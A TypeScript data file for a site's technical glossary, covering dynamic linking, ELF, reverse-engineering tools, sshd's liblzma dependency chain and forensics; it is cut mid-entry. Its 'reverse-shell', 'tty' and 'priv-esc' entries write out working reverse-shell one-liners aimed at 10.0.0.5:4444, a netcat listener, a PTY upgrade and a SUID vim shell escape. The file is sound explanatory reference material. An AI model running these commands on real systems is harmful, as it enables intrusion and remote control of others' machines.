/* ────────────────────────────────────────────────────
   Site-wide technical glossary.

   Powers <Term slug="..."> hover popovers in MDX, and the
   /tools/glossary/ lookup tool. Mirrors asm-ops.ts so the same
   patterns (URL-keyed selection, body paragraphs, example block,
   primary-source link) carry over.

   Conventions:
   - slug: kebab-case, unique, stable (article markup pins to it)
   - term: display form, exactly as it should appear
   - expansion: full name for acronyms; omit for non-acronyms
   - summary: one general sentence, popover-grade, no editorializing
   - body: detail-page paragraphs; inline `code` allowed
   - example: optional code/syntax example, rendered as <pre>
   - exampleLang: language hint (informational; future Shiki support)
   - moreHref: primary source (spec, docs, canonical reference)
   ──────────────────────────────────────────────────── */

export type Kind = 'linker' | 'binary' | 'ssh' | 'vuln' | 'time' | 'forensics' | 'hardware' | 'crypto';
export type Lang = 'asm' | 'c' | 'bash' | 'python' | 'text';

export interface Entry {
  slug: string;
  term: string;
  expansion?: string;
  kind: Kind;
  summary: string;
  body: string[];
  /**
   * Optional pedagogical figure rendered between the body and the example.
   * Provide either inline SVG markup (`svg`) or an external image (`src`),
   * never both. `alt` is mandatory for accessibility.
   */
  image?: {
    svg?: string;
    src?: string;
    alt: string;
    caption?: string;
    /** Opt raster line-art into the dark-mode invert filter. Default false
     *  (keeps colour heatmaps like spectrograms in their native palette). */
    invert?: boolean;
  };
  example?: string;
  exampleLang?: Lang;
  moreHref?: string;
  moreLabel?: string;
}

export const KINDS: { key: Kind; label: string }[] = [
  { key: 'linker',    label: 'Dynamic linking' },
  { key: 'binary',    label: 'Binary & RE' },
  { key: 'ssh',       label: 'Systems & networking' },
  { key: 'forensics', label: 'Forensics' },
  { key: 'hardware',  label: 'Hardware & signals' },
  { key: 'crypto',    label: 'Cryptography' },
  { key: 'vuln',      label: 'Vulnerability metadata' },
  { key: 'time',      label: 'Time' },
];

export const GLOSSARY: Entry[] = [
  // ── Dynamic linking ────────────────────────────────────────────
  {
    slug: 'ld-so',
    term: 'ld.so',
    kind: 'linker',
    summary:
      "The Linux dynamic linker / loader. Maps shared libraries into a process at startup, resolves symbol references, runs IFUNC resolvers, and applies RELRO before jumping to the program's entry point.",
    body: [
      "Lives at `/lib64/ld-linux-x86-64.so.2` on 64-bit Linux. The kernel reads each ELF's `PT_INTERP` program header to find which interpreter to invoke; ld.so then runs entirely in userspace.",
      "Walks each loaded ELF's `.dynamic` section to collect required shared objects, mmaps them in, fills the GOT with resolved addresses, executes IFUNC resolvers, mprotects the GOT read-only (RELRO), then transfers control to the executable's entry point.",
    ],
    image: {
      src: '/glossary/got-lifecycle.svg',
      alt: 'GOT lifecycle: writable while ld.so resolves symbols and runs IFUNC resolvers, then locked read-only by RELRO.',
      caption: 'The IFUNC window - between symbol resolution and RELRO - is when resolvers run; any GOT writes they perform survive the lock.',
    },
    example: `# every dynamic ELF declares its interpreter
$ readelf -l /bin/ls | grep interpreter
      [Requesting program interpreter: /lib64/ld-linux-x86-64.so.2]

# the loader is itself a runnable program
$ /lib64/ld-linux-x86-64.so.2 --help | head -3
Usage: ld.so [OPTION]... EXECUTABLE-FILE [ARGS-FOR-PROGRAM...]
You have invoked \`ld.so', the program interpreter for dynamically-linked
ELF programs. Usually, the program interpreter is invoked automatically...`,
    exampleLang: 'bash',
    moreHref: 'https://man7.org/linux/man-pages/man8/ld.so.8.html',
    moreLabel: 'man7 - ld.so(8)',
  },
  {
    slug: 'got',
    term: 'GOT',
    expansion: 'Global Offset Table',
    kind: 'linker',
    summary:
      "Per-binary table of resolved addresses for shared-library functions. The dynamic linker fills it at startup; every external call indirects through one slot.",
    body: [
      "A shared library can load anywhere in memory, so its function addresses aren't known at compile time. The compiler emits indirection through the GOT - one entry per imported function - and the dynamic linker writes the real addresses once it knows where each library landed.",
      "All call sites for a given function share the same GOT slot - one entry per imported function, regardless of how many times the function is called.",
    ],
    image: {
      src: '/glossary/got-plt-indirection.svg',
      alt: 'Indirection chain: a call to func@plt jumps into the PLT stub, which loads the function pointer from the matching GOT slot and jumps to the resolved library address.',
      caption: 'Every external call indirects through the PLT stub and the matching GOT slot - one slot per imported function.',
    },
    example: `# JUMP_SLOT relocations live in .rela.plt - one per imported function
$ readelf -r /usr/bin/ls | grep -A4 '\\.rela\\.plt'
Relocation section '.rela.plt' at offset 0x1090:
  Offset          Info           Type           Sym. Value    Sym. Name
  000000003fc8   R_X86_64_JUMP_SLOT  free@GLIBC_2.2.5
  000000003fd0   R_X86_64_JUMP_SLOT  abort@GLIBC_2.2.5
  000000003fd8   R_X86_64_JUMP_SLOT  __errno_location@GLIBC_2.2.5`,
    exampleLang: 'bash',
    moreHref: 'https://www.airs.com/blog/archives/41',
    moreLabel: 'Ian Lance Taylor - How GOT and PLT work',
  },
  {
    slug: 'plt',
    term: 'PLT',
    expansion: 'Procedure Linkage Table',
    kind: 'linker',
    summary:
      "Per-call-site stub that loads the matching GOT entry and jumps to it. Lets every call site for a function share one resolved address.",
    body: [
      "The compiler can't emit `call <library_func>` directly - the library's address isn't known yet. Instead it emits `call func@plt`, where the PLT stub does the indirection.",
      "Each PLT entry is small: load `[GOT+offset]`, jump. On the first call, the stub also triggers lazy resolution and patches the GOT; afterward it's just an indirect jump.",
      "Full RELRO (`-z now`) eliminates lazy resolution: every external symbol is resolved at load, so the PLT stub collapses to `jmp *got(%rip)` and the per-binary `.plt0` trampoline is unused.",
    ],
    image: {
      src: '/glossary/got-plt-indirection.svg',
      alt: 'Indirection chain: a call to func@plt jumps into the PLT stub, which loads the function pointer from the matching GOT slot and jumps to the resolved library address.',
      caption: 'Call → PLT stub → GOT slot → resolved address. The PLT stub is what lets every call site share one slot.',
    },
    example: `# a typical PLT stub on x86-64
RSA_public_decrypt@plt:
    jmp    *RSA_public_decrypt@got(%rip)   # indirect jump through GOT
    push   $0x42                           # symbol index (lazy resolve)
    jmp    .plt.start                      # → dl_runtime_resolve`,
    exampleLang: 'asm',
    moreHref: 'https://www.airs.com/blog/archives/41',
    moreLabel: 'Ian Lance Taylor - How GOT and PLT work',
  },
  {
    slug: 'relro',
    term: 'RELRO',
    expansion: 'Relocation Read-Only',
    kind: 'linker',
    summary:
      "Linker hardening that mprotects the GOT read-only after symbol resolution finishes, so nothing can rewrite those addresses later.",
    body: [
      "Without RELRO, the GOT remains writable for the process lifetime - a high-value target for any attacker who acquires arbitrary write.",
      "Two flavors: **partial** RELRO marks `.got` read-only but leaves `.got.plt` (the lazy-resolution slots) writable. **Full** RELRO disables lazy binding entirely so the whole GOT can be locked once startup finishes.",
      "RELRO fires *after* symbol resolution, but IFUNC resolvers run inside that window. Any GOT writes from a resolver land before the lock and survive it.",
    ],
    image: {
      src: '/glossary/got-lifecycle.svg',
      alt: 'GOT lifecycle: writable while ld.so resolves symbols and runs IFUNC resolvers, then locked read-only by RELRO.',
      caption: 'RELRO marks the GOT read-only *after* IFUNC resolvers have run; writes during that gap survive the lock.',
    },
    example: `# linker flags
gcc -Wl,-z,relro              # partial RELRO (default on most distros)
gcc -Wl,-z,relro,-z,now       # full RELRO + bind-now (no lazy resolution)

# dynamic tags - full RELRO emits both BIND_NOW and FLAGS_1 NOW
$ readelf -d ./a.out | grep -E 'BIND_NOW|FLAGS'
 0x0000000000000018 (BIND_NOW)
 0x000000006ffffffb (FLAGS_1)            Flags: NOW PIE

# the GNU_RELRO segment lives in program headers, not dynamic tags
$ readelf -l ./a.out | grep RELRO
  GNU_RELRO    0x002dc8 0x000000003dc8 ...   R    0x1`,
    exampleLang: 'bash',
    moreHref: 'https://www.redhat.com/en/blog/hardening-elf-binaries-using-relocation-read-only-relro',
    moreLabel: 'Red Hat - Hardening ELF binaries with RELRO',
  },
  {
    slug: 'ifunc',
    term: 'IFUNC',
    expansion: 'Indirect Function',
    kind: 'linker',
    summary:
      "GCC attribute that lets a symbol pick its implementation at startup via a resolver function - used for CPU-feature-aware dispatch.",
    body: [
      "A function tagged `__attribute__((ifunc(\"resolver\")))` doesn't have a fixed body. At process startup the *dynamic* linker calls the named resolver and uses the pointer it returns as the symbol's real implementation.",
      "Classic use is hardware dispatch: pick a CLMUL-accelerated CRC64 on capable CPUs, fall back to a table version elsewhere. The right implementation is chosen once, with no per-call branch.",
      "The mechanism runs inside `_dl_relocate_object`, before RELRO marks the GOT read-only. Anything the resolver writes during that window survives the lock.",
    ],
    image: {
      src: '/glossary/got-lifecycle.svg',
      alt: 'GOT lifecycle: writable while ld.so resolves symbols and runs IFUNC resolvers, then locked read-only by RELRO.',
      caption: 'IFUNC resolvers fire inside the writable-GOT window; anything they write survives the RELRO lock.',
    },
    example: `typedef uint64_t crc64_fn(const uint8_t *, size_t);

static crc64_fn *resolve_crc64(void) {
    return cpu_has_clmul() ? crc64_clmul : crc64_table;
}

uint64_t crc64(const uint8_t *buf, size_t n)
    __attribute__((ifunc("resolve_crc64")));`,
    exampleLang: 'c',
    moreHref: 'https://gcc.gnu.org/onlinedocs/gcc/Common-Function-Attributes.html#index-ifunc-function-attribute',
    moreLabel: 'GCC - ifunc attribute',
  },
  {
    slug: 'r-debug',
    term: '_r_debug',
    kind: 'linker',
    summary:
      "Well-known global the dynamic linker exposes; head of a doubly-linked list of `link_map` entries (one per loaded shared object).",
    body: [
      "The canonical hook for *runtime* introspection of the loaded process map. GDB uses it to track library load and unload; address-space layout tools depend on it.",
      "Reading `_r_debug.r_map` gives you the head of a doubly-linked list of `link_map` structs - one per loaded SO, each carrying load address, absolute file name, and a pointer into the object's `.dynamic` section.",
    ],
    example: `extern struct r_debug _r_debug;

struct link_map *m = _r_debug.r_map;
while (m) {
    printf("%lx  %s\\n", (unsigned long)m->l_addr, m->l_name);
    m = m->l_next;
}`,
    exampleLang: 'c',
    moreHref: 'https://sourceware.org/git/?p=glibc.git;a=blob;f=elf/link.h;hb=HEAD',
    moreLabel: 'glibc - elf/link.h',
  },
  {
    slug: 'link-map',
    term: 'link_map',
    kind: 'linker',
    summary:
      "Per-shared-object struct the dynamic linker uses to track load address, file name, dynamic-section pointer, and links to neighboring loaded objects.",
    body: [
      "One per loaded shared object. Stitched into a doubly-linked list reachable as `_r_debug.r_map`.",
      "Carries enough information to do everything `dlsym` does - find an object by name, locate its symbol table - without going through libc.",
    ],
    example: `struct link_map {
    ElfW(Addr)       l_addr;   // load base address
    char            *l_name;   // absolute file name of the SO
    ElfW(Dyn)       *l_ld;     // pointer to .dynamic section
    struct link_map *l_next;
    struct link_map *l_prev;
};`,
    exampleLang: 'c',
    moreHref: 'https://sourceware.org/git/?p=glibc.git;a=blob;f=elf/link.h;hb=HEAD',
    moreLabel: 'glibc - elf/link.h',
  },
  {
    slug: 'dynsym',
    term: '.dynsym',
    kind: 'linker',
    summary:
      "ELF section holding the dynamic symbol table - the symbols visible at runtime to other modules and the dynamic linker.",
    body: [
      "Distinct from `.symtab`, the full and strippable symbol table. `.dynsym` is the runtime-required one: it survives `strip`, it's part of the loaded image, and the dynamic linker uses it for symbol resolution.",
      "Inspect with `readelf --dyn-syms` or `nm -D`. The companion `.dynstr` section holds the actual symbol-name strings - `.dynsym` entries reference them by offset.",
    ],
    example: `$ readelf --dyn-syms /usr/lib/libcrypto.so.3 | grep RSA_public_decrypt
   1234: 0000000000211420  1136 FUNC    GLOBAL DEFAULT   13 RSA_public_decrypt`,
    exampleLang: 'bash',
    moreHref: 'https://refspecs.linuxfoundation.org/elf/gabi4+/ch4.symtab.html',
    moreLabel: 'System V gABI - Symbol Table',
  },

  // ── Binary format ───────────────────────────────────────────────
  {
    slug: 'elf',
    term: 'ELF',
    expansion: 'Executable and Linkable Format',
    kind: 'binary',
    summary:
      "The standard binary format for executables, shared libraries, and object files on Linux and most Unixes.",
    body: [
      "An ELF file is a header followed by section data and program headers. The OS reads the program headers to map the file into memory; tools read the section table for symbol info, debug data, and so on.",
      "Identifies itself by the magic bytes `0x7F 'E' 'L' 'F'` at offset 0. Inspect with `readelf`, `objdump -d`, `nm`.",
    ],
    image: {
      src: '/glossary/elf-layout.svg',
      alt: 'ELF file layout - ELF header at the top, followed by the program-header table, section data, and the section-header table.',
      caption: 'ELF layout: header, program-header table (used by the loader to map segments), section data, and the section-header table (used by tools and the linker). Source: [Wikimedia Commons (CC-BY-SA)](https://commons.wikimedia.org/wiki/File:Elf-layout--en.svg).',
    },
    example: `$ readelf -h /bin/ls
ELF Header:
  Magic:   7f 45 4c 46 02 01 01 00 00 00 00 00 00 00 00 00
  Class:                             ELF64
  Type:                              DYN (Position-Independent Executable)
  Machine:                           Advanced Micro Devices X86-64
  Entry point address:               0x6ab0`,
    exampleLang: 'bash',
    moreHref: 'https://refspecs.linuxfoundation.org/elf/gabi4+/contents.html',
    moreLabel: 'Linux Foundation - System V gABI',
  },
  {
    slug: 'cet-ibt',
    term: 'CET/IBT',
    expansion: 'Intel Control-flow Enforcement Technology · Indirect Branch Tracking',
    kind: 'binary',
    summary:
      "CPU-enforced indirect-call protection. Every indirect-call target must begin with `endbr64`; otherwise the CPU raises a control-protection fault.",
    body: [
      "Hardware mitigation against ROP/JOP-style indirect-jump abuse. When CET-IBT is enabled, the CPU tracks every indirect call (`call *reg`, `call *(mem)`) and enforces that the destination instruction is an `endbr64`.",
      "A non-`endbr64` target raises `#CP`; the kernel delivers `SIGSEGV` with `si_code = SEGV_CPERR` - the signature to grep for in CET crashes. Direct calls (`call symbol`) are unaffected; protection applies only to indirect targets.",
    ],
    example: `# enable CET branch protection at compile time
gcc -fcf-protection=branch -o app app.c

# every indirect-call target now begins with endbr64
$ objdump -d app | grep -A1 '<main>:'
00000000000011a0 <main>:
    11a0:  f3 0f 1e fa             endbr64`,
    exampleLang: 'bash',
    moreHref: 'https://gcc.gnu.org/onlinedocs/gcc/Instrumentation-Options.html#index-fcf-protection',
    moreLabel: 'GCC - -fcf-protection',
  },
  {
    slug: 'endbr64',
    term: 'endbr64',
    kind: 'binary',
    summary:
      "x86-64 instruction that marks a valid landing pad for an indirect call when CET/IBT is enforced. A NOP on CPUs without CET.",
    body: [
      "Encoded as four bytes: `f3 0f 1e fa`. On older CPUs and CET-disabled binaries it executes as a no-op; on CET-enabled binaries running on a capable CPU, it tells the IBT tracker 'this is a legitimate indirect-call target'.",
      "GCC emits one at the entry of every function eligible to be called indirectly when compiling with `-fcf-protection=branch`. Most distros now enable that flag by default, so virtually every function in a modern shared library starts with `endbr64`.",
    ],
    example: `foo:
    f3 0f 1e fa             endbr64       # CET landing pad - 4 bytes
    55                      push   %rbp
    48 89 e5                mov    %rsp, %rbp
    ...`,
    exampleLang: 'asm',
    moreHref: 'https://gcc.gnu.org/onlinedocs/gcc/Instrumentation-Options.html#index-fcf-protection',
    moreLabel: 'GCC - -fcf-protection',
  },

  {
    slug: 'radare2',
    term: 'radare2',
    kind: 'binary',
    summary:
      "Open-source reverse-engineering framework - disassembler, debugger, hex editor, and binary patcher in a single CLI. `r2` for short.",
    body: [
      "Multi-architecture: x86, ARM, MIPS, RISC-V, PowerPC, and others. Drives a static-analysis engine, a debugger backend (gdb/lldb/native), and a scripting layer (Python/JS/r2pipe).",
      "Commands use a consistent grammar of short letter sequences: `a` analyses, `p` prints, `s` seeks, `?` queries. `aaa` runs all analyses, `afl` lists discovered functions, `pdf` prints disassembly of a function, `axt` shows cross-references *to* an address.",
    ],
    example: `$ r2 ./binary
[0x00001050]> aaa             # analyse all (functions, calls, strings)
[0x00001050]> afl             # function list
[0x00001050]> pdf @ main      # disassemble main
[0x00001050]> axt @ sym.imp.printf   # who calls printf?
[0x00001050]> q               # quit`,
    exampleLang: 'bash',
    moreHref: 'https://book.rada.re/',
    moreLabel: 'The Radare2 Book',
  },
  {
    slug: 'binary-ninja',
    term: 'Binary Ninja',
    kind: 'binary',
    summary:
      "Commercial reverse-engineering platform by Vector 35. Disassembler, decompiler, type system, and Python-scripted analysis built around three IR tiers (LLIL / MLIL / HLIL).",
    body: [
      "Multi-architecture (x86, ARM, MIPS, RISC-V, PowerPC, more via plugin). The decompiler emits C-like pseudocode. Three IR tiers - LLIL, MLIL, HLIL - expose the binary at raw, machine-independent SSA, and near-source levels, so custom analyses pick the right granularity.",
      "Licensing: perpetual personal licence with paid major-version updates; an in-browser free tier exists for one-off triage. Scripting is Python-first with stable C++ and Rust internals.",
    ],
    example: `# launch the GUI
$ binaryninja ./binary

# headless Python - list every function and its HLIL
import binaryninja as bn
with bn.load('./binary') as bv:
    for fn in bv.functions:
        print(f"{fn.start:#x}  {fn.name}")
        for il in fn.hlil.instructions:
            print(f"    {il}")`,
    exampleLang: 'bash',
    moreHref: 'https://docs.binary.ninja/',
    moreLabel: 'Vector 35 - Binary Ninja docs',
  },
  {
    slug: 'ghidra',
    term: 'Ghidra',
    kind: 'binary',
    summary:
      "Open-source reverse-engineering platform released by the NSA in 2019. Disassembler, decompiler, P-code IR, and Java/Python scripting in a Swing GUI.",
    body: [
      "Multi-architecture; the decompiler produces C-like pseudocode for every supported processor. Analyses run against P-code, Ghidra's machine-independent IR, so a single pass works on any architecture the front end can lift.",
      "Headless mode (`analyzeHeadless`) drives a project from the command line for batch processing. Scripting is Java by default with a Python (Jython) layer; community PyGhidra adds CPython.",
    ],
    example: `# headless analysis: import a binary and run a script
$ analyzeHeadless /tmp/proj MyProj \\
    -import ./binary \\
    -postScript ListFunctions.java
# ListFunctions.java
import ghidra.app.script.GhidraScript;
public class ListFunctions extends GhidraScript {
  public void run() throws Exception {
    for (var f : currentProgram.getFunctionManager().getFunctions(true))
      println(f.getEntryPoint() + "  " + f.getName());
  }
}`,
    exampleLang: 'bash',
    moreHref: 'https://ghidra-sre.org/',
    moreLabel: 'NSA - Ghidra',
  },

  // ── SSH & system ────────────────────────────────────────────────
  {
    slug: 'sshd',
    term: 'sshd',
    kind: 'ssh',
    summary:
      "OpenSSH server daemon. Runs as root; accepts SSH connections and performs authentication.",
    body: [
      "Maintained by the OpenBSD project as part of OpenSSH; packaged on virtually every Linux distribution. The bulk of public-internet shell access on Linux servers terminates here.",
      "Forks a per-connection child that does the SSH handshake, verifies credentials, and (on success) drops privileges to the user before launching their shell. Pre-auth code runs as root - which is why a remote-code-execution bug here is catastrophic.",
    ],
    example: `$ ldd /usr/sbin/sshd
    libcrypto.so.3 => /lib/x86_64-linux-gnu/libcrypto.so.3
    libsystemd.so.0 => /lib/x86_64-linux-gnu/libsystemd.so.0
    libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6
    liblzma.so.5 => /lib/x86_64-linux-gnu/liblzma.so.5    # transitive`,
    exampleLang: 'bash',
    moreHref: 'https://man.openbsd.org/sshd',
    moreLabel: 'OpenBSD - sshd(8)',
  },
  {
    slug: 'liblzma',
    term: 'liblzma',
    kind: 'ssh',
    summary:
      "Compression library shipped by xz utils. Provides LZMA / XZ encode and decode.",
    body: [
      "Used by package managers (`.tar.xz`), archivers, journald (for journal compression), and any application that handles XZ-compressed data.",
      "On systemd distros it ends up loaded by sshd via `sshd → libsystemd → liblzma`, even though sshd never compresses anything itself - pulled in transitively because libsystemd uses it for journal compression.",
    ],
    image: {
      src: '/glossary/liblzma-chain.svg',
      alt: 'Dependency chain diagram: sshd (with the distro sd_notify patch) loads libsystemd, which transitively pulls in liblzma for journal compression.',
      caption: 'How sshd ends up linked to liblzma on systemd distributions - through the distro `sd_notify` patch and libsystemd\'s journal-compression dependency.',
    },
    example: `$ pkg-config --modversion liblzma
5.6.0

$ ldd /usr/sbin/sshd | grep liblzma
    liblzma.so.5 => /lib/x86_64-linux-gnu/liblzma.so.5    # via libsystemd`,
    exampleLang: 'bash',
    moreHref: 'https://tukaani.org/xz/',
    moreLabel: 'tukaani.org - XZ Utils',
  },
  {
    slug: 'libsystemd',
    term: 'libsystemd',
    kind: 'ssh',
    summary:
      "systemd client library. Provides the C API for talking to systemd from userspace.",
    body: [
      "Service notification (`sd_notify`), structured journal logging (`sd_journal_*`), D-Bus helpers, watchdog support, socket activation.",
      "Pulls in liblzma (for journal compression) and other transitive dependencies even when only `sd_notify` is used. The full dependency closure of a client library is rarely audited by the application that links it.",
    ],
    image: {
      src: '/glossary/liblzma-chain.svg',
      alt: 'Dependency chain: sshd → libsystemd → liblzma.',
      caption: 'Each step in the chain is innocuous in isolation; the combination is what brings liblzma into a daemon that has no business compressing anything.',
    },
    example: `#include <systemd/sd-daemon.h>

int main(void) {
    /* ... */
    sd_notify(0, "READY=1");
    /* ... */
}`,
    exampleLang: 'c',
    moreHref: 'https://www.freedesktop.org/software/systemd/man/libsystemd.html',
    moreLabel: 'systemd - libsystemd(3)',
  },
  {
    slug: 'sd-notify',
    term: 'sd_notify',
    kind: 'ssh',
    summary:
      "systemd API for a service to signal readiness or status changes to the init system.",
    body: [
      "Called from a `Type=notify` service to tell systemd 'I'm ready to accept connections' (`READY=1`), report status changes, request a watchdog ping, or signal a graceful restart.",
      "Most distros patch sshd to call `sd_notify(READY=1)` at startup so systemd's notify-style service tracking works - the link path that pulls libsystemd into sshd.",
    ],
    example: `#include <systemd/sd-daemon.h>

/* tell systemd we are ready */
sd_notify(0, "READY=1");

/* report a status string visible in 'systemctl status' */
sd_notify(0, "STATUS=Serving 42 active connections");

/* graceful shutdown signal */
sd_notify(0, "STOPPING=1");`,
    exampleLang: 'c',
    moreHref: 'https://www.freedesktop.org/software/systemd/man/sd_notify.html',
    moreLabel: 'systemd - sd_notify(3)',
  },
  {
    slug: 'rsa-public-decrypt',
    term: 'RSA_public_decrypt',
    kind: 'ssh',
    summary:
      "OpenSSL function that takes a signature, decrypts it with a public key, and returns the recovered plaintext. Used to verify RSA signatures.",
    body: [
      "The 'decrypt' name is historical - the operation is just modular exponentiation with the public key. For verifying a signature, the recovered plaintext is the hash the signer produced; comparing it to a hash you computed yourself confirms validity.",
      "Called by SSH and TLS during certificate and signature verification. Every caller in a process shares libcrypto's single GOT slot for this symbol, so the function is reachable through one well-known indirection from any code that links libcrypto.",
      "Deprecated since OpenSSL 3.0 in favor of `EVP_PKEY_verify_recover`. `libcrypto.so.3` keeps the symbol exported for ABI compatibility, so existing binaries continue to link to it without source changes.",
    ],
    example: `unsigned char recovered[RSA_size(rsa)];

int n = RSA_public_decrypt(siglen, signature, recovered,
                           rsa, RSA_PKCS1_PADDING);

/* recovered now holds the hash the signer computed -
   compare to your own to verify. */`,
    exampleLang: 'c',
    moreHref: 'https://docs.openssl.org/3.0/man3/RSA_public_encrypt/',
    moreLabel: 'OpenSSL - RSA_public_decrypt(3)',
  },

  {
    slug: 'tty',
    term: 'TTY',
    expansion: 'Teletypewriter / terminal device',
    kind: 'ssh',
    summary:
      "Unix kernel device representing a terminal. Today usually a virtual console (`/dev/tty1`) or one half of a pseudo-terminal pair (`/dev/pts/N` slave + `/dev/ptmx` master).",
    body: [
      "Provides line discipline (echo, line buffering, signal generation on `Ctrl-C`/`Ctrl-Z`) between a process's stdio and its terminal. The name dates to Teletype Model 33 keyboards-on-paper. `/dev/tty` is the kernel-resolved alias for the calling process's controlling terminal; `tty(1)` prints which device that is.",
      "A pseudo-terminal (PTY) emulates a TTY in software for ssh, `xterm`, `tmux`. Open `/dev/ptmx` for the master fd; the kernel pairs it with a slave under `/dev/pts/N`. Bytes flow master ↔ slave so userspace can drive a shell as if a human were typing - exactly what reverse-shell payloads upgrade to via `python3 -c 'import pty; pty.spawn(\"bash\")'`.",
    ],
    example: `# Which TTY am I on, and is stdin a terminal?
$ tty
/dev/pts/3
$ [ -t 0 ] && echo "stdin is a TTY" || echo "piped"
stdin is a TTY

# Upgrade a dumb reverse shell to a full PTY
$ python3 -c 'import pty; pty.spawn("/bin/bash")'`,
    exampleLang: 'bash',
    moreHref: 'https://man7.org/linux/man-pages/man4/pts.4.html',
    moreLabel: 'man7 - pts(4)',
  },
  {
    slug: 'reverse-shell',
    term: 'reverse shell',
    kind: 'ssh',
    summary:
      "Shell session where the target dials out to the attacker. Inverts the bind-shell pattern to bypass inbound firewalls and NAT.",
    body: [
      "The payload `connect()`s out to attacker-controlled `IP:port`, dups the socket onto stdio, and `execve()`s a shell. Most egress filters allow outbound 80/443/53, so attackers pick those ports. Compare to a bind shell, which listens on the victim and is dead on arrival behind any inbound firewall.",
      "Bash's `/dev/tcp` virtual filesystem (a Bash-only extension, not a real device) lets a one-liner open a TCP socket and redirect stdio onto it. Detection: any shell whose stdio is a socket, plus a long-lived outbound connection from a non-browser process - often paired with a PTY upgrade right after.",
    ],
    example: `# Attacker
$ nc -lvnp 4444

# Victim - Bash reverse shell over /dev/tcp (no nc required)
$ bash -c 'bash -i >& /dev/tcp/10.0.0.5/4444 0>&1'

# Equivalent in pure Python (fallback when bash lacks /dev/tcp)
$ python3 -c 'import socket,os,pty;s=socket.socket();s.connect(("10.0.0.5",4444));[os.dup2(s.fileno(),f) for f in (0,1,2)];pty.spawn("/bin/bash")'`,
    exampleLang: 'bash',
    moreHref: 'https://en.wikipedia.org/wiki/Shellcode#Remote',
    moreLabel: 'Wikipedia - Shellcode (remote/connect-back)',
  },
  {
    slug: 'priv-esc',
    term: 'privilege escalation',
    kind: 'ssh',
    summary:
      "MITRE ATT&CK tactic TA0004: gaining higher permissions on a system. Vertical crosses a privilege boundary (user → root); horizontal pivots to a peer user's resources.",
    body: [
      "Vertical escalation crosses a trust boundary the OS enforces - unprivileged user to root, or unprivileged process to kernel. Horizontal stays at the same level but pivots into another user's resources; common in web-app authz bugs (IDOR) and shared-host environments.",
      "Linux vectors: SUID/SGID binaries with exploitable behaviour, `sudo` misconfigs (`NOPASSWD` on a binary that shells out - see GTFOBins), file capability flags, unpatched kernel LPE CVEs, writable PATH dirs, root-equivalent groups (`docker`, `lxd`). Enumerate with `linpeas`, `pspy`, `linux-exploit-suggester`.",
    ],
    example: `# Common Linux priv-esc enumeration one-liners
$ find / -perm -4000 -type f 2>/dev/null   # world-exec SUID binaries
$ sudo -l                                  # what can I run as root?
$ getcap -r / 2>/dev/null                  # file capabilities
$ uname -r && cat /etc/os-release          # kernel + distro for LPE search
$ id                                       # any 'docker' / 'lxd' group?

# Classic SUID-on-vim trick (from GTFOBins)
$ vim -c ':!/bin/sh -p'`,
    exampleLang: 'bash',
    moreHref: 'https://attack.mitre.org/tactics/TA0004/',
    moreLabel: 'MITRE ATT&CK - TA0004 Privilege Escalation',
  },

  // ── Forensics ───────────────────────────────────────────────────
  {
    slug: 'steganography',
    term: 'steganography',
    kind: 'forensics',
    summary:
      "Hiding a message's existence inside an innocuous carrier - image, audio, filesystem - so an observer never knows there is anything to find.",
    body: [
      "From Greek *steganós* ('covered'). Distinct from cryptography: ciphertext announces a secret exists; steganography hides that fact. The two compose - encrypt the payload, then embed the ciphertext.",
      "LSB image steganography replaces the lowest bit of each RGB channel: invisible to the eye (1/256 colour shift), one bit per channel per pixel of bandwidth. Audio variants do the same on PCM samples, or hide payloads as visible patterns in a spectrogram.",
    ],
    example: `# extract LSBs from an image's red channel into a bitstream
from PIL import Image
img  = Image.open('cover.png')
bits = [px[0] & 1 for px in img.getdata()]   # LSB of red channel

# pack 8 bits per byte, look for printable text or a known magic
data = bytes(int(''.join(map(str, bits[i:i+8])), 2)
             for i in range(0, len(bits) - 7, 8))
print(data[:64])`,
    exampleLang: 'python',
    moreHref: 'https://en.wikipedia.org/wiki/Steganography',
    moreLabel: 'Wikipedia - Steganography',
  },
  {
    slug: 'spectrogram',
    term: 'spectrogram',
    kind: 'forensics',
    summary:
      "Time-frequency heatmap of a signal: time on x, frequency on y, colour intensity = energy at that frequency at that moment.",
    body: [
      "Computed via the Short-Time Fourier Transform: window the signal, FFT each window, plot squared magnitude. Window length sets the time/frequency tradeoff - short windows localise events, long windows localise tones.",
      "For audio with hidden content the spectrogram is often the only viable viewer: text, QR codes, and DTMF tones drawn into the frequency domain show up even when the signal sounds like noise. `scipy.signal.spectrogram` returns the arrays; Audacity and `sox spectrogram` render the picture.",
    ],
    image: {
      src: '/glossary/spectrogram-example.png',
      alt: 'Spectrogram of the spoken phrase "nineteenth century" - frequency on the vertical axis, time on the horizontal, intensity (energy) shown by colour.',
      caption: 'Spectrogram of the spoken phrase *nineteenth century*. Source: [Wikipedia (CC-BY-SA)](https://en.wikipedia.org/wiki/Spectrogram).',
    },
    example: `import numpy as np
from scipy.io import wavfile
from scipy.signal import spectrogram
import matplotlib.pyplot as plt

fs, audio = wavfile.read('challenge.wav')
f, t, Sxx = spectrogram(audio, fs=fs, nperseg=1024, noverlap=512)

plt.pcolormesh(t, f, 10 * np.log10(Sxx), shading='gouraud')
plt.ylabel('Frequency [Hz]'); plt.xlabel('Time [s]')
plt.show()`,
    exampleLang: 'python',
    moreHref: 'https://en.wikipedia.org/wiki/Spectrogram',
    moreLabel: 'Wikipedia - Spectrogram',
  },
  {
    slug: 'volatility',
    term: 'Volatility',
    kind: 'forensics',
    summary:
      "Open-source memory-forensics framework. Parses raw RAM dumps to recover process lists, network connections, loaded modules, registry hives, and arbitrary kernel structures.",
    body: [
      "Lets an analyst introspect a captured memory image as if it were a live system - process tree, open sockets, loaded modules, registry hives, kernel structures. Supports Windows, Linux, and macOS profiles; built around per-OS symbol tables that map kernel structures to offsets.",
      "Plugin-driven: `windows.pslist` for processes, `windows.netscan` for sockets, `windows.cmdline` for command lines, `windows.dlllist` for loaded DLLs. Linux equivalents live under the `linux.*` namespace.",
    ],
    example: `# list processes from a memory dump
$ vol -f memory.dmp windows.pslist
PID    PPID    ImageFileName    Offset(V)         Threads    ...
4      0       System           0xfa800186e040    98
72     4       Registry         0xfa800186e040    4
348    4       smss.exe         0xfa8001a78400    2
...

# enumerate loaded DLLs for a specific PID
$ vol -f memory.dmp windows.dlllist --pid 1234`,
    exampleLang: 'bash',
    moreHref: 'https://volatilityfoundation.org/',
    moreLabel: 'Volatility Foundation',
  },

  // ── Hardware & signals ─────────────────────────────────────────
  {
    slug: 'lfsr',
    term: 'LFSR',
